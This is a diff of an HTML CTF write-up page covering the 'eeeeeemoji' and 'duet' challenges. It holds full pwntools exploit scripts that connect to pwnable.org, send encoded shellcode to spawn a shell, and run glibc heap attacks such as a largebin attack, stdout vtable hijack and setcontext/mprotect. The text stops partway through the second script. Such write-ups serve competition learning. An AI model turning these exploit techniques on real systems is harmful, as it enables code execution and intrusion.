@@ -156,6 +156,8 @@
     
                 <a class="dropdown-item" href="#eeeeeemoji">eeeeeemoji</a>
     
+                <a class="dropdown-item" href="#duet">duet</a>
+    
               </div>
             </li>
     
@@ -266,6 +268,10 @@
     
 <a href="#eeeeeemoji" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">eeeeeemoji</span>
+            </a>
+    
+<a href="#duet" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">duet</span>
             </a>
     
           </div>
@@ -1029,162 +1035,170 @@ elf = ELF(binary)
 mmap+0x230 code = add rsp,0x8000
 add 0x230000,0x8000 = 0x238000</p>
 <ul class="list">
-<li>Probability changes rsp to mmap-0x8000, and controls the register to execute mmap+0 ~ mmap+0x100 shellcode to get the shell.
-<code>`</code>python3=
-#!/usr/bin/env python3<h1 id="-*--coding:-utf-8--*-"><a class="header-link" href="#-*--coding:-utf-8--*-"></a>-<em>- coding: utf-8 -</em>-</h1>
+<li>Probability changes rsp to mmap-0x8000, and controls the register to execute mmap+0 ~ mmap+0x100 shellcode to get the shell.</li>
+</ul>
+<pre class="hljs"><code>#!/usr/bin/env <span class="hljs-keyword">python3</span>
+# -*- codin<span class="hljs-variable">g:</span> utf-<span class="hljs-number">8</span> -*-
 from pwn import *
 import sys
 import time
 import random
-host = &#39;pwnable.org&#39;
-port = 31323</li>
-</ul>
-<p>binary = &quot;./eeeeeemoji&quot;
+host = <span class="hljs-string">'pwnable.org'</span>
+port = <span class="hljs-number">31323</span>
+
+binary = <span class="hljs-string">"./eeeeeemoji"</span>
 context.binary = binary
 elf = ELF(binary)
-try:
-  libc = ELF(&quot;./libc.so.6&quot;)
-  log.success(&quot;libc load success&quot;)
-  system_off = libc.symbols.system
-  log.success(&quot;system_off = &quot;+hex(system_off))
-except:
-  log.failure(&quot;libc not found !&quot;)</p>
-<p>if len(sys.argv) == 1:
-  r = process([binary, &quot;0&quot;], env={&quot;LD_LIBRARY_PATH&quot;:&quot;.&quot;})</p>
-<p>else:
-  r = remote(host ,port)</p>
-<p>def convert(data,src=&#39;utf8&#39;):
-    if src==&#39;utf8&#39;:
-        L = len(data)
-        cursor = 0
-        res = b&#39;&#39;
-        while cursor&lt;L:
-            binstr = &#39;0&#39;
-            firstbyte = data[cursor]
-            batchsize = 0
-            for i in range(8):
-                if firstbyte&amp;(1&lt;&lt;(7-i))==0:
-                    batchsize = i
-                    break
-            if batchsize&gt;6:
-                print(&#39;error&#39;)
-                exit()
-            binstr+=bin(data[cursor])[2:].rjust(8,&#39;0&#39;)[batchsize+1:]
-            for i in range(1,batchsize):
-                binstr+=bin(data[cursor+i])[2:].rjust(8,&#39;0&#39;)[2:]
-            num = int(binstr,2)
-            res+=p32(num)
-            cursor+=batchsize
-            if batchsize==0:
-                cursor+=1
-        return res
-    elif src==&#39;wchar&#39;:
-        L = len(data)
-        res = b&#39;&#39;
-        if L%4!=0:
-            L+=4-L%4
-            data = data.ljust(L,b&#39;\x00&#39;)
-        print(data)
-        for i in range(0,L,4):
-            num = u32(data[i:i+4])
-            print(hex(num))
-            if num&lt;0x80:
-                res+=p8(num)
-            elif num&lt;0x800:
-                binstr = bin(num)[2:].rjust(11,&#39;0&#39;)
-                res+=p8(0xc0|int(binstr[:5],2))+p8(0x80|int(binstr[5:],2))
-            elif num&lt;0x10000:
-                binstr = bin(num)[2:].rjust(16,&#39;0&#39;)
-                res+=p8(0xe0|int(binstr[:4],2))
-                for j in range(2):
-                    res+=p8(0x80|int(binstr[4+j<em>6:4+j</em>6+6],2))
-            elif num&lt;0x200000:
-                binstr = bin(num)[2:].rjust(21,&#39;0&#39;)
-                res+=p8(0xf0|int(binstr[:3],2))
-                for j in range(3):
-                    res+=p8(0x80|int(binstr[3+j<em>6:3+j</em>6+6],2))
-            elif num&lt;0x4000000:
-                binstr = bin(num)[2:].rjust(26,&#39;0&#39;)
-                res+=p8(0xf8|int(binstr[:2],2))
-                for j in range(4):
-                    res+=p8(0x80|int(binstr[2+j<em>6:2+j</em>6+6],2))
-            elif num&lt;0x80000000:
-                binstr = bin(num)[2:].rjust(31,&#39;0&#39;)
-                res+=p8(0xfc|int(binstr[:1],2))
-                for j in range(5):
-                    res+=p8(0x80|int(binstr[1+j<em>6:1+j</em>6+6],2))
-            else:
-                binstr = bin(num)[2:].rjust(36,&#39;0&#39;)
-                res+=p8(0xfe)
-                for j in range(6):
-                    res+=p8(0x80|int(binstr[j<em>6:j</em>6+6],2))
-        return res</p>
-<p>if <strong>name</strong> == &#39;<strong>main</strong>&#39;:
-  print(r.recvline())
-  print(r.recvline())
-  print(r.recvline())
-  print(r.recvline())</p>
-<p>  while 1:
-    r.sendline(&quot;🍺&quot;))
-    print(r.recvline())
-    r.recvuntil(&quot;@&quot;)
-    data = r.recvline()
-    mmap = int(data[:-1].decode(),16)
-    print(&quot;mmap = {}&quot;.format(hex(mmap)))
-    if(mmap &amp; 0x8000):
-      break
-    print(r.recvline())
-    print(r.recvline())
-    print(r.recvline())
-  print(r.recvline())
-  print(r.recvline())
-  print(r.recvline())
-  r.sendline(&quot;🐴&quot;))
-  print(r.recvline())
-  shellcode = convert(asm(&quot;xor eax,eax&quot;) + asm(&quot;add al,0&quot;),&quot;wchar&quot;)
-  shellcode += convert(asm(&quot;xor edi,edi&quot;) + asm(&quot;add al,0&quot;),&quot;wchar&quot;)
-  shellcode += convert(asm(&quot;xor edx,edx&quot;) + asm(&quot;add al,0&quot;),&quot;wchar&quot;)
-  shellcode += convert(asm(&quot;add dh,cl&quot;) + asm(&quot;add al,0&quot;),&quot;wchar&quot;)
-  shellcode += convert(asm(&quot;syscall&quot;) + asm(&quot;add al,0&quot;),&quot;wchar&quot;)
-  r.sendline((convert(p32(mmap+0x88),&quot;wchar&quot;) + convert(p32(0),&quot;wchar&quot;))<em>0x11 + convert(p32(mmap+0x90),&quot;wchar&quot;) + convert(p32(0),&quot;wchar&quot;)  + shellcode  +convert(p32(0x7fffffff),&quot;wchar&quot;)</em>0x57 + convert(p32(0xd421),&quot;wchar&quot;)*10)</p>
-<p>  r.sendline(b&quot;\x90&quot;*0x50 + asm(shellcraft.sh()))
-  time.sleep(0.3)
-  r.sendline(b&quot;ls&quot;)
-  r.interactive()</p>
-<pre class="hljs"><code>
-`flag{thanks_Plaid_CTF_we_found_th1s}`
-
-### Duet
-
-* Option <span class="hljs-number">5</span> can calloc <span class="hljs-number">0x88</span> <span class="hljs-keyword">and</span> input <span class="hljs-number">1</span> byte overflow.
-* Heap overlap will leak libc &amp; heap.
-* Largebin attack global_max_fast.
-* Fastbin attack stdout to <span class="hljs-built_in">get</span> stdout buffer (stdout flag <span class="hljs-built_in">is</span> <span class="hljs-number">0x000000fbxxxxxx</span>, so <span class="hljs-number">0x000000fb</span> can use to be fastbin size).
-* Change puts stdout vtable to _IO_wfile_sync, <span class="hljs-keyword">and</span> contorl rip &amp; rdi.
-* Jump magic <span class="hljs-keyword">and</span> setcontext to call mprotect, <span class="hljs-keyword">and</span> finally execute shellcode.
-
-```python=
-#!/usr/bin/env python
-# -*- coding: utf-<span class="hljs-number">8</span> -*-
-from pwn import *
-import sys
-import <span class="hljs-built_in">time</span>
-import <span class="hljs-built_in">random</span>
-host = 'pwnable.org'
-port = <span class="hljs-number">12356</span>
-
-binary = <span class="hljs-string">"./duet"</span>
-<span class="hljs-built_in">context</span>.binary = binary
-elf = ELF(binary)
-try:
+<span class="hljs-keyword">try</span>:
   libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)
   <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"libc load success"</span>)
   system_off = libc.symbols.<span class="hljs-built_in">system</span>
   <span class="hljs-built_in">log</span>.success(<span class="hljs-string">"system_off = "</span>+hex(system_off))
-except:
+excep<span class="hljs-variable">t:</span>
   <span class="hljs-built_in">log</span>.failure(<span class="hljs-string">"libc not found !"</span>)
 
-def <span class="hljs-built_in">new</span>(index,data):
+
+<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.<span class="hljs-built_in">argv</span>) == <span class="hljs-number">1</span>:
+  r = process([binary, <span class="hljs-string">"0"</span>], env={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
+
+<span class="hljs-keyword">else</span>:
+  r = remote(host ,port)
+
+
+def convert(data,src=<span class="hljs-string">'utf8'</span>):
+    <span class="hljs-keyword">if</span> src==<span class="hljs-string">'utf8'</span>:
+        L = <span class="hljs-built_in">len</span>(data)
+        <span class="hljs-built_in">cursor</span> = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">res</span> = <span class="hljs-keyword">b</span><span class="hljs-string">''</span>
+        <span class="hljs-keyword">while</span> <span class="hljs-built_in">cursor</span>&lt;L:
+            binstr = <span class="hljs-string">'0'</span>
+            firstbyte = data[<span class="hljs-built_in">cursor</span>]
+            batchsize = <span class="hljs-number">0</span>
+            <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+                <span class="hljs-keyword">if</span> firstbyte&amp;(<span class="hljs-number">1</span>&lt;&lt;(<span class="hljs-number">7</span>-i))==<span class="hljs-number">0</span>:
+                    batchsize = i
+                    <span class="hljs-keyword">break</span>
+            <span class="hljs-keyword">if</span> batchsize&gt;<span class="hljs-number">6</span>:
+                <span class="hljs-keyword">print</span>(<span class="hljs-string">'error'</span>)
+                <span class="hljs-keyword">exit</span>()
+            binstr+=bin(data[<span class="hljs-built_in">cursor</span>])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">'0'</span>)[batchsize+<span class="hljs-number">1</span>:]
+            <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,batchsize):
+                binstr+=bin(data[<span class="hljs-built_in">cursor</span>+i])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">'0'</span>)[<span class="hljs-number">2</span>:]
+            num = <span class="hljs-keyword">int</span>(binstr,<span class="hljs-number">2</span>)
+            <span class="hljs-keyword">res</span>+=p32(num)
+            <span class="hljs-built_in">cursor</span>+=batchsize
+            <span class="hljs-keyword">if</span> batchsize==<span class="hljs-number">0</span>:
+                <span class="hljs-built_in">cursor</span>+=<span class="hljs-number">1</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">res</span>
+    elif src==<span class="hljs-string">'wchar'</span>:
+        L = <span class="hljs-built_in">len</span>(data)
+        <span class="hljs-keyword">res</span> = <span class="hljs-keyword">b</span><span class="hljs-string">''</span>
+        <span class="hljs-keyword">if</span> L%<span class="hljs-number">4</span>!=<span class="hljs-number">0</span>:
+            L+=<span class="hljs-number">4</span>-L%<span class="hljs-number">4</span>
+            data = data.ljust(L,<span class="hljs-keyword">b</span><span class="hljs-string">'\x00'</span>)
+        <span class="hljs-keyword">print</span>(data)
+        <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,L,<span class="hljs-number">4</span>):
+            num = u32(data[i:i+<span class="hljs-number">4</span>])
+            <span class="hljs-keyword">print</span>(hex(num))
+            <span class="hljs-keyword">if</span> num&lt;<span class="hljs-number">0</span>x80:
+                <span class="hljs-keyword">res</span>+=p8(num)
+            elif num&lt;<span class="hljs-number">0</span>x800:
+                binstr = bin(num)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">11</span>,<span class="hljs-string">'0'</span>)
+                <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>xc0|<span class="hljs-keyword">int</span>(binstr[:<span class="hljs-number">5</span>],<span class="hljs-number">2</span>))+p8(<span class="hljs-number">0</span>x80|<span class="hljs-keyword">int</span>(binstr[<span class="hljs-number">5</span>:],<span class="hljs-number">2</span>))
+            elif num&lt;<span class="hljs-number">0</span>x10000:
+                binstr = bin(num)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">16</span>,<span class="hljs-string">'0'</span>)
+                <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>xe0|<span class="hljs-keyword">int</span>(binstr[:<span class="hljs-number">4</span>],<span class="hljs-number">2</span>))
+                <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
+                    <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>x80|<span class="hljs-keyword">int</span>(binstr[<span class="hljs-number">4</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>:<span class="hljs-number">4</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>+<span class="hljs-number">6</span>],<span class="hljs-number">2</span>))
+            elif num&lt;<span class="hljs-number">0</span>x200000:
+                binstr = bin(num)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">21</span>,<span class="hljs-string">'0'</span>)
+                <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>xf0|<span class="hljs-keyword">int</span>(binstr[:<span class="hljs-number">3</span>],<span class="hljs-number">2</span>))
+                <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
+                    <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>x80|<span class="hljs-keyword">int</span>(binstr[<span class="hljs-number">3</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>:<span class="hljs-number">3</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>+<span class="hljs-number">6</span>],<span class="hljs-number">2</span>))
+            elif num&lt;<span class="hljs-number">0</span>x4000000:
+                binstr = bin(num)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">26</span>,<span class="hljs-string">'0'</span>)
+                <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>xf8|<span class="hljs-keyword">int</span>(binstr[:<span class="hljs-number">2</span>],<span class="hljs-number">2</span>))
+                <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
+                    <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>x80|<span class="hljs-keyword">int</span>(binstr[<span class="hljs-number">2</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>:<span class="hljs-number">2</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>+<span class="hljs-number">6</span>],<span class="hljs-number">2</span>))
+            elif num&lt;<span class="hljs-number">0</span>x80000000:
+                binstr = bin(num)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">31</span>,<span class="hljs-string">'0'</span>)
+                <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>xfc|<span class="hljs-keyword">int</span>(binstr[:<span class="hljs-number">1</span>],<span class="hljs-number">2</span>))
+                <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
+                    <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>x80|<span class="hljs-keyword">int</span>(binstr[<span class="hljs-number">1</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>:<span class="hljs-number">1</span>+<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>+<span class="hljs-number">6</span>],<span class="hljs-number">2</span>))
+            <span class="hljs-keyword">else</span>:
+                binstr = bin(num)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">36</span>,<span class="hljs-string">'0'</span>)
+                <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>xfe)
+                <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):
+                    <span class="hljs-keyword">res</span>+=p8(<span class="hljs-number">0</span>x80|<span class="hljs-keyword">int</span>(binstr[<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>:<span class="hljs-keyword">j</span>*<span class="hljs-number">6</span>+<span class="hljs-number">6</span>],<span class="hljs-number">2</span>))
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">res</span>
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+  <span class="hljs-keyword">print</span>(r.recvline())
+  <span class="hljs-keyword">print</span>(r.recvline())
+  <span class="hljs-keyword">print</span>(r.recvline())
+  <span class="hljs-keyword">print</span>(r.recvline())
+
+  <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    r.sendline(<span class="hljs-string">"🍺"</span>))
+    <span class="hljs-keyword">print</span>(r.recvline())
+    r.recvuntil(<span class="hljs-string">"@"</span>)
+    data = r.recvline()
+    mmap = <span class="hljs-keyword">int</span>(data[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)
+    <span class="hljs-keyword">print</span>(<span class="hljs-string">"mmap = {}"</span>.format(hex(mmap)))
+    <span class="hljs-keyword">if</span>(mmap &amp; <span class="hljs-number">0</span>x8000):
+      <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">print</span>(r.recvline())
+    <span class="hljs-keyword">print</span>(r.recvline())
+    <span class="hljs-keyword">print</span>(r.recvline())
+  <span class="hljs-keyword">print</span>(r.recvline())
+  <span class="hljs-keyword">print</span>(r.recvline())
+  <span class="hljs-keyword">print</span>(r.recvline())
+  r.sendline(<span class="hljs-string">"🐴"</span>))
+  <span class="hljs-keyword">print</span>(r.recvline())
+  shellcode = convert(asm(<span class="hljs-string">"xor eax,eax"</span>) + asm(<span class="hljs-string">"add al,0"</span>),<span class="hljs-string">"wchar"</span>)
+  shellcode += convert(asm(<span class="hljs-string">"xor edi,edi"</span>) + asm(<span class="hljs-string">"add al,0"</span>),<span class="hljs-string">"wchar"</span>)
+  shellcode += convert(asm(<span class="hljs-string">"xor edx,edx"</span>) + asm(<span class="hljs-string">"add al,0"</span>),<span class="hljs-string">"wchar"</span>)
+  shellcode += convert(asm(<span class="hljs-string">"add dh,cl"</span>) + asm(<span class="hljs-string">"add al,0"</span>),<span class="hljs-string">"wchar"</span>)
+  shellcode += convert(asm(<span class="hljs-string">"syscall"</span>) + asm(<span class="hljs-string">"add al,0"</span>),<span class="hljs-string">"wchar"</span>)
+  r.sendline((convert(p32(mmap+<span class="hljs-number">0</span>x88),<span class="hljs-string">"wchar"</span>) + convert(p32(<span class="hljs-number">0</span>),<span class="hljs-string">"wchar"</span>))*<span class="hljs-number">0</span>x11 + convert(p32(mmap+<span class="hljs-number">0</span>x90),<span class="hljs-string">"wchar"</span>) + convert(p32(<span class="hljs-number">0</span>),<span class="hljs-string">"wchar"</span>)  + shellcode  +convert(p32(<span class="hljs-number">0</span>x7fffffff),<span class="hljs-string">"wchar"</span>)*<span class="hljs-number">0</span>x57 + convert(p32(<span class="hljs-number">0</span>xd421),<span class="hljs-string">"wchar"</span>)*<span class="hljs-number">10</span>)
+
+  r.sendline(<span class="hljs-keyword">b</span><span class="hljs-string">"\x90"</span>*<span class="hljs-number">0</span>x50 + asm(shellcraft.<span class="hljs-keyword">sh</span>()))
+  time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.3</span>)
+  r.sendline(<span class="hljs-keyword">b</span><span class="hljs-string">"ls"</span>)
+  r.interactive()
+
+</code></pre><p><code>flag{thanks_Plaid_CTF_we_found_th1s}</code></p>
+<h3 id="duet"><a class="header-link" href="#duet"></a>Duet</h3>
+<ul class="list">
+<li>Option 5 can calloc 0x88 and input 1 byte overflow.</li>
+<li>Heap overlap will leak libc &amp; heap.</li>
+<li>Largebin attack global_max_fast.</li>
+<li>Fastbin attack stdout to get stdout buffer (stdout flag is 0x000000fbxxxxxx, so 0x000000fb can use to be fastbin size).</li>
+<li>Change puts stdout vtable to _IO_wfile_sync, and contorl rip &amp; rdi.</li>
+<li>Jump magic and setcontext to call mprotect, and finally execute shellcode.</li>
+</ul>
+<pre class="hljs"><code>#!/usr/bin/env python
+# -*- coding: utf<span class="hljs-number">-8</span> -*-
+from pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> <span class="hljs-built_in">random</span>
+host = <span class="hljs-string">'pwnable.org'</span>
+port = <span class="hljs-number">12356</span>
+
+binary = <span class="hljs-string">"./duet"</span>
+context.binary = binary
+elf = ELF(binary)
+<span class="hljs-built_in">try</span>:
+  libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)
+  log.success(<span class="hljs-string">"libc load success"</span>)
+  system_off = libc.symbols.system
+  log.success(<span class="hljs-string">"system_off = "</span>+hex(system_off))
+except:
+  log.failure(<span class="hljs-string">"libc not found !"</span>)
+
+def <span class="hljs-keyword">new</span>(index,data):
   r.recvuntil(<span class="hljs-string">": "</span>)
   r.sendline(<span class="hljs-string">"1"</span>)
   r.recvuntil(<span class="hljs-string">": "</span>)
@@ -1203,7 +1217,7 @@ def <span class="hljs-built_in">remove</span>(index):
   r.sendline(index)
   pass
 
-def <span class="hljs-built_in">show</span>(index):
+def show(index):
   r.recvuntil(<span class="hljs-string">": "</span>)
   r.sendline(<span class="hljs-string">"3"</span>)
   r.recvuntil(<span class="hljs-string">": "</span>)
@@ -1215,75 +1229,75 @@ def heap(b):
   r.recvuntil(<span class="hljs-string">": "</span>)
   r.sendline(str(b))
 
-<span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">1</span>:
-  r = process([binary, <span class="hljs-string">"0"</span>], env={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
+<span class="hljs-built_in">if</span> len(sys.argv) == <span class="hljs-number">1</span>:
+  r = <span class="hljs-built_in">process</span>([binary, <span class="hljs-string">"0"</span>], env={<span class="hljs-string">"LD_LIBRARY_PATH"</span>:<span class="hljs-string">"."</span>})
 
-<span class="hljs-keyword">else</span>:
+<span class="hljs-built_in">else</span>:
   r = remote(host ,port)
 
-<span class="hljs-keyword">if</span> __name__ == '__main__':
+<span class="hljs-built_in">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
   fuck = {<span class="hljs-number">0</span>: <span class="hljs-string">"琴"</span>,<span class="hljs-number">1</span>:<span class="hljs-string">"瑟"</span>}
-  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">xrange</span>(<span class="hljs-number">7</span>):
-    <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x80</span>)
+  <span class="hljs-built_in">for</span> i in xrange(<span class="hljs-number">7</span>):
+    <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x80</span>)
     <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-    <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0xe0</span>)
+    <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0xe0</span>)
     <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-    <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0xf0</span>)
+    <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0xf0</span>)
     <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-    <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x1e0</span>)
+    <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x1e0</span>)
     <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-    <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x140</span>)
+    <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x140</span>)
     <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
     <span class="hljs-built_in">print</span> i
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x88</span>)
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0xf0</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x88</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0xf0</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
   heap(<span class="hljs-number">0xf1</span>)
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],p64(<span class="hljs-number">0x81</span>)*<span class="hljs-number">60</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],p64(<span class="hljs-number">0x81</span>)*<span class="hljs-number">60</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">96</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">96</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],p64(<span class="hljs-number">0x91</span>)*<span class="hljs-number">31</span> + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">11</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],p64(<span class="hljs-number">0x91</span>)*<span class="hljs-number">31</span> + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">11</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-  <span class="hljs-built_in">show</span>(fuck[<span class="hljs-number">1</span>])
+  show(fuck[<span class="hljs-number">1</span>])
   r.recv(<span class="hljs-number">0x105</span>)
   libc = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0x1e4ca0</span>
   <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc = {}"</span>.format(hex(libc)))
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">60</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">60</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
 
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">128</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">128</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">xrange</span>(<span class="hljs-number">6</span>):
-    <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x400</span>)
+  <span class="hljs-built_in">for</span> i in xrange(<span class="hljs-number">6</span>):
+    <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x400</span>)
     <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
     <span class="hljs-built_in">print</span> i
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x400</span>)
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x200</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x400</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x200</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x80</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x80</span>)
 
 
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],p64(<span class="hljs-number">0x91</span>)*<span class="hljs-number">31</span> + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">11</span>)
